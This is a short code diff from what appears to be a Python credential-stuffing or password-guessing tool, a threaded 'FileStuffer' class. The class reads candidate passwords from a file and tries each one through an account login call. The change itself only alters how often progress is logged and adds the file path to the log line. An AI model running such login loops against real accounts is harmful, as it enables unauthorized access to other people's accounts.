@@ -33,5 +33,5 @@ class FileStuffer(Stuffer, threading.Thread):
                 password = line.strip('\n')
                 # execute login
                 self.account_login(password=password)
-                if (lineno % 2000) == 0:
-                    self.logger.info("Line number {} with password {}".format(lineno, password))
+                if (lineno % 1000) == 0:
+                    self.logger.info("File {} with line number {} and password {}".format(self.filepath, lineno, password))
